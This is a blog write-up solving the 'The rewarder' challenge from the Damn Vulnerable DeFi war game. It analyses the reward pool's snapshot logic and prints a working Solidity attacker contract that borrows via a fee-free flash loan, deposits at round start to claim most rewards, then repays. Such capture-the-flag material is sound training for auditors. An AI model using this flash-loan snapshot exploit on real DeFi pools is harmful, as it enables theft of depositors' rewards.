---
title: 'Damn Vulnerable DeFi Challenge #5 Solution — The rewarder'
excerpt: 'Damn Vulnerable DeFi is the war game created by @tinchoabbate to learn offensive security of DeFi smart contracts.</br></br>You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.'
coverImage:
  url: '/assets/blog/ethereum.jpg'
  credit:
    name: Nenad Novaković
    url: https://unsplash.com/@dvlden
date: '2020-04-18T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethereum.jpg'
---

[Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/index.html) is the war game created by [@tinchoabbate](https://twitter.com/tinchoabbate) to learn offensive security of DeFi smart contracts.

Throughout numerous challenges, you will build the skills to become a bug hunter or security auditor in the space.

## Challenge #5  —  The rewarder

> There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
>
> Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
>
> You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
>
> Oh, by the way, rumours say a new pool has just landed on mainnet. Isn’t it offering DVT tokens in flash loans?

- [See contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.0.0/contracts/the-rewarder)
- [Hack it](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/the-rewarder/the-rewarder.challenge.js)

## The attacker end goal

We start with zero DVT token, and the end goal of this challenge is to steal all the Pool’s reward, or at least most of them. To do that as the challenge description suggest we have to leverage the lending pool that offer flashloans without fee.

## Study the contracts

### `FlashLoanerPool.sol`

This is the Lending pool contract, nothing wrong here. It offers a flashloan function called `flashLoan`. It’s a pretty standard function where you specify the amount, it checks to have enough token before sending them to you, execute `receiveFlashLoan(uint256)` on the `msg.sender` and then check that the sender has repaid the loan.

### `RewardToken.sol`

This is the Reward ERC20 contract. Also here nothing special, when it’s created it set up a couple of roles and only the minter role can mint tokens toward an account. Both the Admin and Minter are the `msg.sender` that created the contract.

### `AccountingToken.sol`

Is an ERC20 contract that inherit from [OpenZeppelin’s ERC20Snapshot](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot). Directly from the OZ documentation:

> This contract extends an ERC20 token with a snapshot mechanism. When a snapshot is created, the balances and total supply at the time are recorded for later access.

> This can be used to safely create mechanisms based on token balances such as trustless dividends or weighted voting. In naive implementations it’s possible to perform a “double spend” attack by reusing the same balance from different accounts. By using snapshots to calculate dividends or voting power, those attacks no longer apply. It can also be used to create an efficient ERC20 forking mechanism.

So basically, `AccountingToken` contract allows the `TheRewarderPool` contract to manage the amount of DVT token that have been deposited/withdrawn and the snapshot logic.

### `TheRewarderPool.sol`

This is the main contract we are interested into. Let’s dive into it and see what’s going on function by function:

`function deposit(uint256 amountToDeposit) external`

- check if the amount is > 0
- mint the `AccountingToken` 1:1 with `DVT`
- call `distributeRewards`
- `transfer` from `msg.sender` to this the deposited amount of DVT tokens and check the transfer result

`function withdraw(uint256 amountToWithdraw) external`

- burn the amount from `AccountingToken` (it’s an ERC20 contract, so it will fail if the `msg.sender` has not enough balance deposited)
- transfer back the withdrawn DVT to `msg.sender` checking the result of the operation

`function isNewRewardsRound() public view returns (bool)`

The logic here is pretty simple: `return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;`

It checks if from the last reward distribution time (`lastRecordedSnapshotTimestamp`) registered by `_recordSnapshot()` has at least passed `REWARDS_ROUND_MIN_DURATION` (5 days). Basically, it’s a new round if from the previous distribution **has passed at least 5 days**.

`function distributeRewards() public returns (uint256)`

- Check if it’s a new reward round calling `isNewRewardsRound()` (has passed 5 days). If so, call `_recordSnapshot()`
- Get the total amount of DVT token deposited in the pool on the last snapshot
- Get the amount of DVT token deposited by the user on the pool
- Calculate the amount of reward token to be rewarded to the user based on the percentage of contribution `rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;`
- If he gets some rewards and those rewards are not yet distributed to the user, the contract mint those rewards and send them to the `msg.sender`

Ok, now we have a good understanding of the scenario. For the next round, we need to have enough token deposited in the pool to get the vast majority of the rewards. The pool is not checking for how long we have deposited our tokens to distribute a fair amount of token, so we just need to have them deposited for the time had to get the rewards.

## Solution code

First we have to create a new Contract because as you can see, only a contract can execute and receive the flash loans.

This temporary contract will:

- Wait for the amount of time needed to start a new round and be able to make the Rewarder Pool trigger the `_recordSnapshot` at deposit time
- Check the amount of DVT token we can borrow with a flashloan from the Flashloan Pool
- Flashloan the max amount (we are not paying any fees)
- Deposit all the DVT token we just loaned. The `deposit` function will trigger `distributeRewards` function that will take a snapshot before distributing tokens to our account. Because we are the bigger staker in the pool, we are going to get the vast majority of reward tokens.
- Withdraw all the deposited DVT from the pool. We don’t need them anymore because we already got all the rewards needed, and we also need to repay back the loan!
- Repay back the loan to the Lending Pool
- Transfer all the rewards to the attacker

Here’s the code of the Attacker’s contract explained in the section above.

```solidity
// Do not use this code
// Part of the https://www.damnvulnerabledefi.xyz/ challenge

contract Executor {

    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    address owner;

    constructor(DamnValuableToken _liquidityToken, FlashLoanerPool _flashLoanPool, TheRewarderPool _rewarderPool, RewardToken _rewardToken) {
        owner = msg.sender;
        liquidityToken = _liquidityToken;
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint256 borrowAmount) external {
        require(msg.sender == address(flashLoanPool), "only pool");

        liquidityToken.approve(address(rewarderPool), borrowAmount);

        // theorically depositing DVT call already distribute reward if the next round has already started
        rewarderPool.deposit(borrowAmount);

        // we can now withdraw everything
        rewarderPool.withdraw(borrowAmount);

        // we send back the borrowed tocken
        bool payedBorrow = liquidityToken.transfer(address(flashLoanPool), borrowAmount);
        require(payedBorrow, "Borrow not payed back");

        // we transfer the rewarded RewardToken to the contract's owner
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        bool rewardSent = rewardToken.transfer(owner, rewardBalance);

        require(rewardSent, "Reward not sent back to the contract's owner");
    }

    function attack() external {
        require(msg.sender == owner, "only owner");

        uint256 dvtPoolBalance = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(dvtPoolBalance);
    }
}
```

You can find the full solution on GitHub, looking at [TheRewarderTest.t.sol](https://github.com/StErMi/forge-damn-vulnerable-defi/blob/main/src/test/the-rewarder/TheRewarderTest.t.sol)

If you want to try yourself locally, just execute `forge test --match-contract TheRewarderTest -vv`

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION
